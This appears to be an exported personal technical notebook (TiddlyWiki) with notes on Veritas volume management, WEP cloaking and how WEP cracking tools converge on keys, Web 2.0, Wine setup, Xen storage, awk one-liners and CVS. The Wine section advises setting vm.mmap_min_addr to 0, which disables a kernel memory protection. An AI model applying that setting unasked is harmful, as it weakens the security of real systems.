vxassist [-b] [-g diskgroup] make volume length layout=stripe stripeunit=&lt;&gt; ncol=&lt;&gt; [disks..]
vxassist -b -g mydg make stripevol 30g layout=stripe mydg03 mydg04 mydg05
vxassist -b -g mydg make stripevol 30g layout=stripe stripeunit=32k ncol=5

# To create a mirrored-stripe volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length layout=mirror-stripe [nmirror=number_mirrors] [ncol=number_of_columns] [stripewidth=size]
# To create a striped-mirror volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length layout=stripe-mirror [nmirror=number_mirrors] [ncol=number_of_columns] [stripewidth=size]


# To create a RAID-5 volume, use the following command:
vxassist [-b] [-g diskgroup] make volume length layout=raid5 [ncol=number_of_columns] [stripewidth=size] [nlog=number] [loglen=log_length]
vxassist -b -g mydg make volraid 10g layout=raid5 nlog=2
vxassist -b -g mydg -o ordered make volraid 10g layout=raid5 ncol=3 nlog=2 logdisk=mydg07,mydg08 mydg04 mydg05 mydg06


# You can use the tag attribute with the vxassistmake command to set a named 
# tag and optional tag value on a volume, for example:
vxassist -b -g mydg make volmir 5g layout=mirror tag=mirvol=5g
vxassist [-g diskgroup] listtag volume
vxassist [-g diskgroup] list tag=tagname volume


# To display the volume, plex, and subdisk record information for all volumes 
# in the system, use the following command: 
vxprint -hvt
# The vxprint command can also be applied to a single disk group: 
vxprint -g mydg -hvt
vxprint -g mydf -t &lt;volume&gt;


# To stop a volume 
vxvol [-g diskgroup] [-f] stop volume ...
vxvol [-g diskgroup] [-f] stopall
# To place a volume in maintenance mode, use the following command:
vxvol [-g diskgroup] maint volume

# To start a volume 
vxvol [-g diskgroup] start volume ...
vxvol -g diskgroup startall
vxrecover -g diskgroup -s volume ...
vxrecover -s

# A mirror can be added to an existing volume with the vxassist command
vxassist [-b] [-g diskgroup] mirror &lt;volume&gt;
# To remove a mirror from a volume
vxassist [-g diskgroup] remove mirror &lt;volume&gt;
}}}

!Volume Resizing
{{{
# To find out by how much you can grow a volume
vxassist [-g diskgroup] maxgrow &lt;volume&gt;
# If you have a VxFS file system, shrink the file system first, and then 
# shrink the volume. The vxresize command offers the advantage of automatically 
# resizing certain types of file system as well as the volume.
			Full-VxFS 	Lite-VxFS 	ext2, ext3, reiserfs 
Mounted File System 	Grow and shrink Not allowed 	Not allowed 
Unmounted File System 	Not allowed 	Not allowed 	Grow and shrink
# For example, the following command resizes the 1-gigabyte volume, homevol,
# in the disk group, mydg, that contains a VxFS file system to 10 gigabytes using
3 the spare disks mydg10 and mydg11:
vxresize -g mydg -b -F vxfs -t homevolresize homevol 10g \ mydg10 mydg11
# The -b option specifies that this operation runs in the background. Its progress
# can be monitored by specifying the task tag homevolresize to the vxtask
# command.
vxassist [-b] [-g diskgroup] growto volumelength
vxassist [-b] [-g diskgroup] growby volumelength
vxassist [-g diskgroup] shrinkto volumelength
vxassist -g mydg shrinkby volcat 300
}}}

!Volume tagging
Volume tags are used to implement the Dynamic Storage Tiering feature of the
Storage Foundation software.

Tag names can consist of letters (A through Z and a through z), numbers 
(0 through 9), dashes (-), underscores (_) or periods (.) from the ASCII 
character set. A tag name must start with either a letter or an underscore
Tag values can consist of any character from the ASCII character set with a 
decimal value from 32 through 127.

The tag names site, udid and vdid are reserved and should not be used. To 
avoid possible clashes with future product features, it is recommended that 
tag names do not start with any of the following strings: asl, be, isp, nbu, 
sf, symc or vx.

{{{
vxassist [-g diskgroup] settag volume tagname[=tagvalue] 
vxassist [-g diskgroup] replacetag volume oldtag newtag 
vxassist [-g diskgroup] removetag volume tagname
vxassist [-g diskgroup] listtag volume
vxassist [-g diskgroup] list tag=tagname volume
vxassist -g mydg settag myvol &quot;dbvol=table space 1&quot;
}}}

!Volume Read Policies
VxVM offers the choice of the following read policies on the data plexes in a mirrored volume:
* round - Reads each plex in turn in round-robin fashion for each nonsequential I/O detected. Sequential access causes only one plex to be accessed. This takes advantage of the drive or controller read-ahead caching policies.
* prefer - Reads first from a plex that has been named as the preferred plex.  
* select - Chooses a default policy based on plex associations to the volume. If the volume has an enabled striped plex, the select option defaults to preferring that plex; otherwise, it defaults to round-robin.
* siteread - Reads preferentially from plexes at the locally defined site. This is the default policy for volumes in disk groups where site consistency has been enabled.

!Volume sets
Limitations of volume sets
# A maximum of 2048 volumes may be configured in a volume set.
# Only Veritas File System is supported on a volume set.
#  The first volume (index 0) in a volume set must be larger than the sum of the total volume size divided by 4000, the size of the VxFS intent log, and 1MB.
# Raw I/O from and to a volume set is not supported.
# Raw I/O from and to the component volumes of a volume set is supported under certain conditions. 
# Volume sets can be used in place of volumes with the following vxsnap operations on instant snapshots: addmir, dis, make, prepare, reattach, refresh, restore, rmmir, split, syncpause, syncresume, syncstart, syncstop, syncwait, and unprepare. The third-mirror break-off usage model for full-sized instant snapshots is supported for volume sets provided that sufficient plexes exist for each volume in the volume set.
# A full-sized snapshot of a volume set must itself be a volume set with the same number of volumes and the same volume index numbers as the parent. The corresponding volumes in the parent and snapshot volume sets are also subject to the same restrictions as apply between standalone volumes and their snapshots.

To guard against accidental file system and data corruption, the device nodes of the component volumes are configured by default not to have raw and block entries in the /dev/vx/rdsk/diskgroup and /dev/vx/dsk/diskgroup directories. As a result, applications are prevented from directly reading from or writing to the component volumes of a volume set.

Access to the raw device nodes for the component volumes can be configured to be read-only or read-write. This mode is shared by all the raw device nodes for the component volumes of a volume set. The read-only access mode implies that any writes to the raw device will fail, however writes using the ioctl interface or by VxFS to update metadata are not prevented. The read-write access mode allows direct writes via the raw device. The access mode to the raw device nodes of a volume set can be changed as required.

{{{
# To create a volume set for use by VxFS
vxvset [-g diskgroup] -t vxfs make volset volume

# to add volumes to the volume set
vxvset [-g diskgroup] [-f] addvol volset volume

To list the details of the component volumes of a volume set,
vxvset [-g diskgroup] list [volset]

To stop and restart one or more volume sets, use the following commands:
# vxvset [-g diskgroup] stop volset ...
# vxvset [-g diskgroup] start volset ...

To remove a component volume from a volume set, use the following command:
# vxvset [-g diskgroup] [-f] rmvol volset volume

# To enable raw device access when creating a volume set
vxvset [-g diskgroup] -o makedev=on [-o compvol_access={read-only|read-write}] [-o index] [-c &quot;ch_addopt&quot;] make vset vol [index]

# To enable or disable raw device node access for an existing volume set
vxvset [-g diskgroup] [-f] set makedev={on|off} vset
vxvet [-g diskgroup] [-f] set compvol_access={read-only|read-write} vset
}}}





</pre>
</div>
<div title="WEP Cloaking" modifier="BhargavaKancherla" modified="200807071110" created="200801140834" changecount="2">
<pre>!WEP Cloaking

WEP cracking tools work by collecting WEP encrypted packets over the air, then run them through these statistical attack filters and try to converge to the authorised network's key. Only those packets containing weak ~IVs help in the cracking process. An IV is the initialisation vector which is transmitted in the clear with each WEP encrypted packet and is used along with the WEP key to decrypt the packet. A weak IV is an IV which satisfies one or more of the FMS and Korek statistical attack conditions. 

WEP Cloaking technique sends spoofed WEP encrypted packets a.k.a 'chaff' into the air. These packets are spefically crafted to try and confuse WEP cracking tools which subsequently fail to crack the WEP key. The MAC header would be spoofed o use addresses of the Access Points and clients of the authorized network that the technique is intended to protect. The chagg packtes thus get homegenously mixed with authorized network packets and it is difficult to  tell them apart by glancing at a pakcet trace. 

WEP cracking is byte by byte process. Once the first byte is cracked we move on tot the next byte. All the guessed bytes will be used in guessing into the next bytes. Aircrack prints the votes in favor of the possibilites for that byte and choosed the 'guessed byte' as the one with the highest vote. In prescence of chaffing we will demonstrate that the votes for each possibility for the byte in question show an abnormal bias towards same values. 	

Sequence number based analysis is a well established way of detecting spoofed packets. Because the sequence number space is small and rewinds quite often, we also use IV based analysis for detecting spoofed packets. By using the sequence number and IV tracing as the preprocessor WEP cracking tools such as Aircrack are easily able to crack the key in the prescence of chaffing. 

</pre>
</div>
<div title="Web 2.0" modifier="BhargavaKancherla" modified="200807151028" created="200807151027" changecount="4">
<pre>!Web 2.0
It facilitates collaboration and sharing. Social networking sites , wikis, podcasts, RSS feeds are all based on Web2.0. Web 2.0 does not have any changes to any technical specifications. It mostly evolved by collaboration between different users of web. It allows the use of internet as a platform for interlinking rather than isolated information. Web.2.0 allows web applications to run like locally-available software in the perception of the user. 

Web2.0 allows users to do more than just retrieve information, it allows users to change information. Users can run applications directly from their browser. It is very interactive.  

Examples are
* Altavista vs Google
* Hotmail vs Yahoo mail
* Mapquest vs Google maps
* geocities vx blogger

!Rich Internet Applications
Web applications which are as interactive as desktop applications. Examples are
* AJAX
* FLEX
* ~OpenLazlo
* Silverlight
* ~JavaFX
These applications are run in a secure environment called a sandbox. These applications use server push techniques.   

!!Ajax
Aysnchronous javascript and xml. Uses ~XMLHttpRequestObject to make asynchronous calls to the browser. User performs a page, javascript makes a asynchronous call to the server behind the scene and gives the callback function which should be called when data returns. When the server sends back the informatoin it is updated on the page without refreshing the whole page. It reduces the amount of data that has to be sent on the network and the page need not be in hanged state waiting for the reply from the server to come. 
Javascript is an interpreted language. 

Example
{{{
function ajax(url, vars, callbackFunction){
	var request = window.XMLHttpRequest ? new XMLHttpRequest (): new ActiveXObject(&quot;MSXML2.XMLHTTP.3.0&quot;);
	request.open(&quot;POST&quot;, url, true);
	reuqest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);	
	request.onreadyStateChange = function(){
		if(request.readyState == 4 &amp;&amp; request.status == 200 )
			if(request.responseText)
				callbackFunction(request.responseText);
	};
	request.send(vars);
	}
}}}

!!Adobe FLEX
It allows flash movies to be specified in XML called MXML. FLEX SDK compiles MXML into a flash movie. The advantage here is now flash file is a text file which can be viewed and diffed. 

!!Microsoft Silverlight
Similar to FLEX used to create animation, vector graphics, audio-video playback. .NET languages and development tools can be used to create silverlight applications. It is scriptable with JavaScript. Also works with XAML (XML-based language created and used by microsoft for use in the .NET framwork 3.0 technologies).

!DOM (document-object model)
Allows a platform and language-independent object model for representing HTML and XML and related formats. AJAX uses DOMs to refresh a part of the page without refreshing the whole page. 

!Cascading Style Sheets
It is a language to describe the colours, fonts, layout, and other presentation aspects of a document. It allows separating of persentation from the content. It allows to specify a priority scheme to determine which style sheet to use incase of multiple style sheets, hence called &quot;cascading&quot;. 

!DHTML
It is a collection of technologies used together to create interactive web sites. It allows combining of HTML, Javascript, CSS and DOM&gt; It allows DOM objects to be exposed to javascript, so that javascript can modify these dom objects. 

!REST or XML or JSON(Javascript object notation) APIs
These APIs provide a way for applications like AJAX to send RPCs to the server and retrieve information.

!!REST
Representational State Transfer. Its a way of sending RPCs across network. 

!!SOAP
Simple Object Access Protocol. Its a protocol for exchanging XML-based RPC messages over computer networks normally using HTTP/HTTPS, similar to REST. 

!RSS (Really Simple Syndication)
Allows new content to be sent to subscribers. Websites would tell in a standard format what are the new changes. 

!Mashups
combine web content from various source and create your own website. 


!Copyright, center and left
Thw way it was charcterized politcally, you had copyright which is what the big companies use to lock everything up; you had copyleft, which is free software's way of making sure they can't lock it up; and then berkley had what we called 'copycenter', which is 'take it down to the copy center and make as many copies as you want.'

--Kirk McKusick, BSDCon 1999

!Offline RIA applications
Its a breed of applications which can work offline, they synchronise state when network is available. Google Gears is one of the example. Google Gears installs a database engine, based on SQLite on the client system which locally caches the data. Pages can use this local cache rather than from the online service and synchronise when necessary. This data store can bee accessed via a javascript API. 

!Single Sign on
Single Sign on allows multiple webserver to assume same authentication server and avoid multiple logons. When user logs into a webserver mail.yahoo.com we provide the username and password, and when we visit another website say maps.yahoo.com then the website would automtically redirect to the authentication server which would find that the user has already authenticated when, and would send a key-id to maps.yahoo.com giving information about the user. 
</pre>
</div>
<div title="Wikipedia" modifier="BhargavaKancherla" created="200807151029" changecount="3">
<pre>!Challenges
* Database replication, multiple-read single-write
* Explicit checks for slave synchronisation lag
* shared cluster caches is memcached
* explicit control of squid reverse proxy caches

Relesaes ''~MediaWiki''.
Uses Subversion for version control. 
Each topic has discussion page. 
IRC feed is available to see the changes. 

!watchlist (RSS)
is currently only based on topics. Plan to do 'watch keywords' , 'watch by similarity' and 'watch by heuristics'.

!Caching Proxies
Proxies all over world cache data on wikipedia to return information from the closest point. Any state information such as logged-in info has to be transferred to the main site. 


</pre>
</div>
<div title="Wine in Ubuntu" modifier="BhargavaKancherla" modified="200807151030" created="200807151029" changecount="3">
<pre>!Installing Wine
{{{
wget -q http://wine.budgetdedicated.com/apt/387EE263.gpg -O- | sudo apt-key add - sudo wget http://wine.budgetdedicated.com/apt/sources.list.d/gutsy.list -O /etc/apt/sources.list.d/winehq.list
sudo apt-get update
sudo apt-get install wine
}}}

!Installing ~MFC42
{{{
sudo apt-get install cabextrace 
wget http://activex.microsoft.com/controls/vc/mfc42.cab
cabextrace mfc42.cab
wine ./mfc42.exe
}}}

!Installing Irfanview
* Download irfanview, and irfanview plugins
* Requires installing ~MFC42 before
{{{
wine iview410_setup.exe
wine irfanview_plugins_410_setup.exe 
}}}

!ERROR &quot;Cannot use first megabyte for DOS address space, please report&quot;
{{{
sudo sysctl -w vm.mmap_min_addr=0
# To be persistent edit /etc/sysctl.conf
}}}

</pre>
</div>
<div title="Wire Instructions" modifier="BhargavaKancherla" modified="200807071148" created="200806260905" changecount="5">
<pre>!E*Trade Wire Transfer Instructions:

Go to:  ''My Account &gt; Preferences &gt; Change Wire Information''

Click on ''Sending to a bank outside the US?''

For IDBI the information is:
{{{
Swift code:     IBKLINBB007
Bank's name: Automatically filled in out by clicking on &quot;Find Bank Name&quot;
Name on account: Automatically filled in by E*Trade
Additional routing code: Your 7 digits Cust ID
Account number:  007xxxxxxxxxxxx
Bank a/c name: Your name
}}}

No other information is required.
(e.g. Sort code, Additional name, additional numbers, other instructions are not needed.)

For Citibank Pune, the information is:
{{{
Swift code:      CITIINBXPUN
Bank's name: Automatically filled in out by clicking on &quot;Find Bank Name&quot;
Name on account: Automatically filled in by E*Trade
Account number:  xxxxxxxxxx
}}}
</pre>
</div>
<div title="XDC" modifier="BhargavaKancherla" modified="200807151044" created="200807151030" changecount="3">
<pre>!Server Pools
Server Pools define the physical systems which form a boundary to which virtual machines could be migrated (similar to cluster). Each pool has one volume server. Each node has a volume client. Full storage connectivity to all the nodes. 

[img[images/Server.Pool.png]]

!VSS
Volume shadow copy services. A framework provided by microsoft. Snapshost applications can integrate with VSS to provide consistent snapshots for exchange server and SQL server. 

!Live Migration
A volume that is used by a virtual machine is owned by the volume client on that node. During migration the volume client on the old host machine releases thevolume and the volume client on the new desitnation physical server acquires the volume. 

!XDC Storage model
Xen storage manager provides a API which volume managers has to support for functioning with XDC. 

!!Storage Objects in Xen
# Virtual Block device
** virtual LUN visible and accessible to guest OS. 
# Virtual Disk Image
** Object representing the phyiscal or virtual storage (volume) providing backing store for Vritual Block Device. 
# Storage Repository
** Group of physical devices, which when used with VxVM would be called as Diskgroup. 

!Central Server
Central server is a virtual machine per pool. It acts as Authentication Broker and Database Server. Its a linux guest. 

[img[images/Xen.Central.Server.png]]

!xptrld
It runs of central server and Dom0 and on all instances of guest OS. It is a ligh-weight http server. 

!Managed Host
Managed host is the managed virtual mahcine. It has Agentlets which is used for storage managers to discover objects or applicationss in the virtual machine. It also hosts DCLI which provides a CLI to do various administrative tasks in the virtual machine. It hosts XDC Reporter, which sends updates to the storage manager about the changes int the virtual machine.  Management Scripts that could be executed from the storage manager to do operations on the virtual mahine. It hosts VRTSat for authentication. 

!DCLI (Windows Guest CLI)
CLI is provided in the guest to discover LUNs used and applications running in the virtual machine. It provides CLI to take snapshots from inside the virtual machine. Also Scheduler CLIs. 

!VSS Plug-in
It contains 2 components
# Requestor - which starts the process of creating a snapshot, by using VSS API provided by windows to get a consistent state. 
# Provider - is a hardware snapshot provider. It communicates with Dom0 for creating volume snapshot.

!SCSI Provision
Each of the virtual LUNs observed by guest OS are visible to the guest OSes as SCSI devices. These SCSI devices only support a limited number of commands. THese SCSI devices do not support SCSI Reservations. Certain features such as Vxfen do not work on these devices. 

</pre>
</div>
<div title="XSFT" modifier="BhargavaKancherla" created="200807151031" changecount="3">
<pre>!CCR - Continous checkpoint and rewind

Software based fault-tolerance against h/w failure, against complete virtual machine failure. Not against protection against software faults in the virtual machine. 

XSFT works by blocking the externally visible output
# Network packets are not sent to the client immediately
# Disk writes are not scheduled immediately
# Output sent only after a checkpoint

The client does not see intermediate system state, system moves from one checkpoint to the other. Failure becomes part of the intermediate state, client does not know when a failure happens. The interval between 2 checkpoints is called an ''epoch''. 

During checkpoint the entire execution context of a virtual machine is replicated. CPU register state, contents of geust physical memory (changes), disk I/O state, network I/O state is transferred to other machine (using usually infiniband)


</pre>
</div>
<div title="YourName" modifier="YourName" created="201006070556" changecount="1">
<pre>BhargavaKancherla</pre>
</div>
<div title="awk Tips" modifier="YourName" modified="200902221509" created="200902221501" changecount="2">
<pre>Explanation of options available at 
http://www.catonmat.net/blog/awk-one-liners-explained-part-one/
http://www.catonmat.net/blog/awk-one-liners-explained-part-two/
http://www.catonmat.net/blog/awk-one-liners-explained-part-three/
http://www.catonmat.net/blog/update-on-famous-awk-one-liners-explained/

{{{
HANDY ONE-LINE SCRIPTS FOR AWK                               30 April 2008
Compiled by Eric Pement - eric [at] pement.org               version 0.27

Latest version of this file (in English) is usually at:
   http://www.pement.org/awk/awk1line.txt

This file will also be available in other languages:
   Chinese  - http://ximix.org/translation/awk1line_zh-CN.txt   

USAGE:

   Unix: awk '/pattern/ {print &quot;$1&quot;}'    # standard Unix shells
DOS/Win: awk '/pattern/ {print &quot;$1&quot;}'    # compiled with DJGPP, Cygwin
         awk &quot;/pattern/ {print \&quot;$1\&quot;}&quot;  # GnuWin32, UnxUtils, Mingw

Note that the DJGPP compilation (for DOS or Windows-32) permits an awk
script to follow Unix quoting syntax '/like/ {&quot;this&quot;}'. HOWEVER, if the
command interpreter is CMD.EXE or COMMAND.COM, single quotes will not
protect the redirection arrows (&lt;, &gt;) nor do they protect pipes (|).
These are special symbols which require &quot;double quotes&quot; to protect them
from interpretation as operating system directives. If the command
interpreter is bash, ksh or another Unix shell, then single and double
quotes will follow the standard Unix usage.

Users of MS-DOS or Microsoft Windows must remember that the percent
sign (%) is used to indicate environment variables, so this symbol must
be doubled (%%) to yield a single percent sign visible to awk.

If a script will not need to be quoted in Unix, DOS, or CMD, then I
normally omit the quote marks. If an example is peculiar to GNU awk,
the command 'gawk' will be used. Please notify me if you find errors or
new commands to add to this list (total length under 65 characters). I
usually try to put the shortest script first. To conserve space, I
normally use '1' instead of '{print}' to print each line. Either one
will work.

FILE SPACING:

 # double space a file
 awk '1;{print &quot;&quot;}'
 awk 'BEGIN{ORS=&quot;\n\n&quot;};1'

 # double space a file which already has blank lines in it. Output file
 # should contain no more than one blank line between lines of text.
 # NOTE: On Unix systems, DOS lines which have only CRLF (\r\n) are
 # often treated as non-blank, and thus 'NF' alone will return TRUE.
 awk 'NF{print $0 &quot;\n&quot;}'

 # triple space a file
 awk '1;{print &quot;\n&quot;}'

NUMBERING AND CALCULATIONS:

 # precede each line by its line number FOR THAT FILE (left alignment).
 # Using a tab (\t) instead of space will preserve margins.
 awk '{print FNR &quot;\t&quot; $0}' files*

 # precede each line by its line number FOR ALL FILES TOGETHER, with tab.
 awk '{print NR &quot;\t&quot; $0}' files*

 # number each line of a file (number on left, right-aligned)
 # Double the percent signs if typing from the DOS command prompt.
 awk '{printf(&quot;%5d : %s\n&quot;, NR,$0)}'

 # number each line of file, but only print numbers if line is not blank
 # Remember caveats about Unix treatment of \r (mentioned above)
 awk 'NF{$0=++a &quot; :&quot; $0};1'
 awk '{print (NF? ++a &quot; :&quot; :&quot;&quot;) $0}'

 # count lines (emulates &quot;wc -l&quot;)
 awk 'END{print NR}'

 # print the sums of the fields of every line
 awk '{s=0; for (i=1; i&lt;=NF; i++) s=s+$i; print s}'

 # add all fields in all lines and print the sum
 awk '{for (i=1; i&lt;=NF; i++) s=s+$i}; END{print s}'

 # print every line after replacing each field with its absolute value
 awk '{for (i=1; i&lt;=NF; i++) if ($i &lt; 0) $i = -$i; print }'
 awk '{for (i=1; i&lt;=NF; i++) $i = ($i &lt; 0) ? -$i : $i; print }'

 # print the total number of fields (&quot;words&quot;) in all lines
 awk '{ total = total + NF }; END {print total}' file

 # print the total number of lines that contain &quot;Beth&quot;
 awk '/Beth/{n++}; END {print n+0}' file

 # print the largest first field and the line that contains it
 # Intended for finding the longest string in field #1
 awk '$1 &gt; max {max=$1; maxline=$0}; END{ print max, maxline}'

 # print the number of fields in each line, followed by the line
 awk '{ print NF &quot;:&quot; $0 } '

 # print the last field of each line
 awk '{ print $NF }'

 # print the last field of the last line
 awk '{ field = $NF }; END{ print field }'

 # print every line with more than 4 fields
 awk 'NF &gt; 4'

 # print every line where the value of the last field is &gt; 4
 awk '$NF &gt; 4'

STRING CREATION:

 # create a string of a specific length (e.g., generate 513 spaces)
 awk 'BEGIN{while (a++&lt;513) s=s &quot; &quot;; print s}'

 # insert a string of specific length at a certain character position
 # Example: insert 49 spaces after column #6 of each input line.
 gawk --re-interval 'BEGIN{while(a++&lt;49)s=s &quot; &quot;};{sub(/^.{6}/,&quot;&amp;&quot; s)};1'

ARRAY CREATION:

 # These next 2 entries are not one-line scripts, but the technique
 # is so handy that it merits inclusion here.
 
 # create an array named &quot;month&quot;, indexed by numbers, so that month[1]
 # is 'Jan', month[2] is 'Feb', month[3] is 'Mar' and so on.
 split(&quot;Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec&quot;, month, &quot; &quot;)

 # create an array named &quot;mdigit&quot;, indexed by strings, so that
 # mdigit[&quot;Jan&quot;] is 1, mdigit[&quot;Feb&quot;] is 2, etc. Requires &quot;month&quot; array
 for (i=1; i&lt;=12; i++) mdigit[month[i]] = i

TEXT CONVERSION AND SUBSTITUTION:

 # IN UNIX ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 awk '{sub(/\r$/,&quot;&quot;)};1'   # assumes EACH line ends with Ctrl-M

 # IN UNIX ENVIRONMENT: convert Unix newlines (LF) to DOS format
 awk '{sub(/$/,&quot;\r&quot;)};1'

 # IN DOS ENVIRONMENT: convert Unix newlines (LF) to DOS format
 awk 1

 # IN DOS ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 # Cannot be done with DOS versions of awk, other than gawk:
 gawk -v BINMODE=&quot;w&quot; '1' infile &gt;outfile

 # Use &quot;tr&quot; instead.
 tr -d \r &lt;infile &gt;outfile            # GNU tr version 1.22 or higher

 # delete leading whitespace (spaces, tabs) from front of each line
 # aligns all text flush left
 awk '{sub(/^[ \t]+/, &quot;&quot;)};1'

 # delete trailing whitespace (spaces, tabs) from end of each line
 awk '{sub(/[ \t]+$/, &quot;&quot;)};1'

 # delete BOTH leading and trailing whitespace from each line
 awk '{gsub(/^[ \t]+|[ \t]+$/,&quot;&quot;)};1'
 awk '{$1=$1};1'           # also removes extra space between fields

 # insert 5 blank spaces at beginning of each line (make page offset)
 awk '{sub(/^/, &quot;     &quot;)};1'

 # align all text flush right on a 79-column width
 awk '{printf &quot;%79s\n&quot;, $0}' file*

 # center all text on a 79-character width
 awk '{l=length();s=int((79-l)/2); printf &quot;%&quot;(s+l)&quot;s\n&quot;,$0}' file*

 # substitute (find and replace) &quot;foo&quot; with &quot;bar&quot; on each line
 awk '{sub(/foo/,&quot;bar&quot;)}; 1'           # replace only 1st instance
 gawk '{$0=gensub(/foo/,&quot;bar&quot;,4)}; 1'  # replace only 4th instance
 awk '{gsub(/foo/,&quot;bar&quot;)}; 1'          # replace ALL instances in a line

 # substitute &quot;foo&quot; with &quot;bar&quot; ONLY for lines which contain &quot;baz&quot;
 awk '/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'

 # substitute &quot;foo&quot; with &quot;bar&quot; EXCEPT for lines which contain &quot;baz&quot;
 awk '!/baz/{gsub(/foo/, &quot;bar&quot;)}; 1'

 # change &quot;scarlet&quot; or &quot;ruby&quot; or &quot;puce&quot; to &quot;red&quot;
 awk '{gsub(/scarlet|ruby|puce/, &quot;red&quot;)}; 1'

 # reverse order of lines (emulates &quot;tac&quot;)
 awk '{a[i++]=$0} END {for (j=i-1; j&gt;=0;) print a[j--] }' file*

 # if a line ends with a backslash, append the next line to it (fails if
 # there are multiple lines ending with backslash...)
 awk '/\\$/ {sub(/\\$/,&quot;&quot;); getline t; print $0 t; next}; 1' file*

 # print and sort the login names of all users
 awk -F &quot;:&quot; '{print $1 | &quot;sort&quot; }' /etc/passwd

 # print the first 2 fields, in opposite order, of every line
 awk '{print $2, $1}' file

 # switch the first 2 fields of every line
 awk '{temp = $1; $1 = $2; $2 = temp}' file

 # print every line, deleting the second field of that line
 awk '{ $2 = &quot;&quot;; print }'

 # print in reverse order the fields of every line
 awk '{for (i=NF; i&gt;0; i--) printf(&quot;%s &quot;,$i);print &quot;&quot;}' file

 # concatenate every 5 lines of input, using a comma separator
 # between fields
 awk 'ORS=NR%5?&quot;,&quot;:&quot;\n&quot;' file

SELECTIVE PRINTING OF CERTAIN LINES:

 # print first 10 lines of file (emulates behavior of &quot;head&quot;)
 awk 'NR &lt; 11'

 # print first line of file (emulates &quot;head -1&quot;)
 awk 'NR&gt;1{exit};1'

  # print the last 2 lines of a file (emulates &quot;tail -2&quot;)
 awk '{y=x &quot;\n&quot; $0; x=$0};END{print y}'

 # print the last line of a file (emulates &quot;tail -1&quot;)
 awk 'END{print}'

 # print only lines which match regular expression (emulates &quot;grep&quot;)
 awk '/regex/'

 # print only lines which do NOT match regex (emulates &quot;grep -v&quot;)
 awk '!/regex/'

 # print any line where field #5 is equal to &quot;abc123&quot;
 awk '$5 == &quot;abc123&quot;'

 # print only those lines where field #5 is NOT equal to &quot;abc123&quot;
 # This will also print lines which have less than 5 fields.
 awk '$5 != &quot;abc123&quot;'
 awk '!($5 == &quot;abc123&quot;)'

 # matching a field against a regular expression
 awk '$7  ~ /^[a-f]/'    # print line if field #7 matches regex
 awk '$7 !~ /^[a-f]/'    # print line if field #7 does NOT match regex

 # print the line immediately before a regex, but not the line
 # containing the regex
 awk '/regex/{print x};{x=$0}'
 awk '/regex/{print (NR==1 ? &quot;match on line 1&quot; : x)};{x=$0}'

 # print the line immediately after a regex, but not the line
 # containing the regex
 awk '/regex/{getline;print}'

 # grep for AAA and BBB and CCC (in any order on the same line)
 awk '/AAA/ &amp;&amp; /BBB/ &amp;&amp; /CCC/'

 # grep for AAA and BBB and CCC (in that order)
 awk '/AAA.*BBB.*CCC/'

 # print only lines of 65 characters or longer
 awk 'length &gt; 64'

 # print only lines of less than 65 characters
 awk 'length &lt; 64'

 # print section of file from regular expression to end of file
 awk '/regex/,0'
 awk '/regex/,EOF'

 # print section of file based on line numbers (lines 8-12, inclusive)
 awk 'NR==8,NR==12'

 # print line number 52
 awk 'NR==52'
 awk 'NR==52 {print;exit}'          # more efficient on large files

 # print section of file between two regular expressions (inclusive)
 awk '/Iowa/,/Montana/'             # case sensitive

SELECTIVE DELETION OF CERTAIN LINES:

 # delete ALL blank lines from a file (same as &quot;grep '.' &quot;)
 awk NF
 awk '/./'

 # remove duplicate, consecutive lines (emulates &quot;uniq&quot;)
 awk 'a !~ $0; {a=$0}'

 # remove duplicate, nonconsecutive lines
 awk '!a[$0]++'                     # most concise script
 awk '!($0 in a){a[$0];print}'      # most efficient script

CREDITS AND THANKS:

Special thanks to the late Peter S. Tillier (U.K.) for helping me with
the first release of this FAQ file, and to Daniel Jana, Yisu Dong, and
others for their suggestions and corrections.

For additional syntax instructions, including the way to apply editing
commands from a disk file instead of the command line, consult:

  &quot;sed &amp; awk, 2nd Edition,&quot; by Dale Dougherty and Arnold Robbins
  (O'Reilly, 1997)

  &quot;UNIX Text Processing,&quot; by Dale Dougherty and Tim O'Reilly (Hayden
  Books, 1987)

  &quot;GAWK: Effective awk Programming,&quot; 3d edition, by Arnold D. Robbins
  (O'Reilly, 2003) or at http://www.gnu.org/software/gawk/manual/

To fully exploit the power of awk, one must understand &quot;regular
expressions.&quot; For detailed discussion of regular expressions, see
&quot;Mastering Regular Expressions, 3d edition&quot; by Jeffrey Friedl (O'Reilly,
2006).

The info and manual (&quot;man&quot;) pages on Unix systems may be helpful (try
&quot;man awk&quot;, &quot;man nawk&quot;, &quot;man gawk&quot;, &quot;man regexp&quot;, or the section on
regular expressions in &quot;man ed&quot;).

USE OF '\t' IN awk SCRIPTS: For clarity in documentation, I have used
'\t' to indicate a tab character (0x09) in the scripts.  All versions of
awk should recognize this abbreviation.

#---end of file---
}}}</pre>
</div>
<div title="cvs" modifier="YourName" modified="200906231001" created="200906230840" changecount="4">
<pre>Checkout the source code
{{{
$ cvs checkout tc
# Checkout a branch or a tagged source code
cvs -r &lt;branch&gt; checkout tc
}}}
Commit changes
{{{
cvs commit backend.c
# commit by specifying comments in the command line
cvs commit -m &quot;Added an optimization pass&quot; backend.c
}}}
Defining the CVS repository to use
{{{
# To checkout from a local repository
cvs -d /usr/local/cvsroot checkout yoyodyne/tc
setenv CVSROOT /usr/local/cvsroot
}}}
Creating a CVS repository
{{{
cvs -d /usr/local/cvsroot init
}}}
CVS uses the remote shell protocol to perform operations on the server, via the rsh or ssh commands. To specify the method to use
{{{
$ CVS_RSH=ssh
$ export CVS_RSH
$ cvs -d :ext:bach@faun:/usr/local/cvsroot checkout foo
# The bach@ can be omitted if the username is the same on 
# both the local and remote hosts.
}}}
Creating a directory tree from an existing source directory (importing files into cvs)
{{{
# If the files you want to install in CVS reside in wdir, and you want them 
# to appear in the repository as $CVSROOT/yoyodyne/rdir, you can do 
$ cd wdir
$ cvs import -m &quot;Imported sources&quot; yoyodyne/rdir
    yoyo start
}}}
Tag a tree (not same as creating a branch). This will the version that is existing in the current working directory
{{{
$ cvs tag rel-1-0 .
cvs tag: Tagging .
T Makefile
T backend.c
T driver.c
T frontend.c
T parser.c
}}}
Tag a tree based upon some date of time 
{{{
# NOT TESTED
